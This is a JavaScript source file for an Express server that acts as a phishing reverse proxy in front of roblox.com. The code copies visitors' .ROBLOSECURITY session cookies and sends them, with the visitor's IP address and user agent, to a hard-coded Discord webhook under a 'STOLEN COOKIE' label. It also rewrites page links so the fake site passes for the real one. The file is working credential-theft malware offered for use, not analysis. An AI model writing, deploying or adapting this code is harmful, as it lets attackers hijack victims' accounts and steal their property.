const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const app = express();
const PORT = process.env.PORT || 3000;

// --- CONFIGURATION ---
const WEBHOOK_URL = "https://discord.com/api/webhooks/1548313898371776622/-5rmm8rPVmEvRERIuoYdLp16BuDnx1DABy9FtIvWW_zJEMUGnI8FORKVppvPx8FrRIyz";
const TARGET = 'https://www.roblox.com';
const COOKIE_NAME = '.ROBLOSECURITY';

let cookieGrabbed = false;

// Helper to rewrite URLs in the response body to keep assets on YOUR domain
// This prevents CORS errors and keeps the session valid
const rewriteUrl = (text) => {
    if (!text) return text;
    // Replace external Roblox asset links to point to your proxy instead
    // This ensures the browser fetches assets from the SAME origin as the HTML
    return text
        .replace(/https:\/\/(images\.rbxcdn\.com|css\.rbxcdn\.com|assetdelivery\.roblox\.com|www\.roblox\.com)/g, (match) => {
            // Return the relative path so it uses the current domain (your railway app)
            return ''; 
        })
        .replace(/href="([^"]+)"/g, (match, url) => {
            if (url.startsWith('http')) {
                // Convert absolute links to relative links so they go through your proxy
                const path = new URL(url).pathname;
                return `href="${path}"`;
            }
            return match;
        })
        .replace(/src="([^"]+)"/g, (match, url) => {
            if (url.startsWith('http')) {
                const path = new URL(url).pathname;
                return `src="${path}"`;
            }
            return match;
        });
};

// Create the proxy
const proxy = createProxyMiddleware({
    target: TARGET,
    changeOrigin: true,
    pathRewrite: { '^/roblox': '' }, // /roblox/login -> /login
    headers: {
        'Host': 'www.roblox.com'
    },
    selfHandleResponse: true,
    on: {
        proxyRes: (proxyRes, req, res) => {
            let chunks = [];
            
            proxyRes.on('data', (chunk) => {
                chunks.push(chunk);
            });

            proxyRes.on('end', () => {
                let body = Buffer.concat(chunks);
                let text = body.toString('utf8');

                // Rewrite URLs to use relative paths (fixing the blank page)
                text = rewriteUrl(text);
                
                res.setHeader('content-type', proxyRes.headers['content-type']);
                res.setHeader('content-length', body.length);
                res.send(text);
            });
        },
        proxyReq: (proxyReq, req, res) => {
            // --- COOKIE STEALING LOGIC ---
            if (!cookieGrabbed && req.headers.cookie) {
                const cookies = req.headers.cookie;
                
                if (cookies.includes(COOKIE_NAME)) {
                    cookieGrabbed = true;
                    console.log("✅ Cookie Found!");

                    const robloxCookie = cookies.split(';').find(c => c.trim().startsWith(COOKIE_NAME) || c.trim().startsWith('ROBLOSECURITY'));

                    // Send to Discord (Fixed Syntax Error)
                    fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            content: `🍪 **STOLEN COOKIE**\n\`\`\`${robloxCookie}\`\`\`\n\n**IP:** ${req.ip.replace(/^::ffff:/, '')}\n**UA:** ${req.headers['user-agent']}`
                        })
                    })
                    .then(() => console.log("Sent to Discord"))
                    .catch(err => console.error("Discord Error:", err));
                }
            }
        }
    }
});

// Apply proxy to all routes
app.use('/', proxy);

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
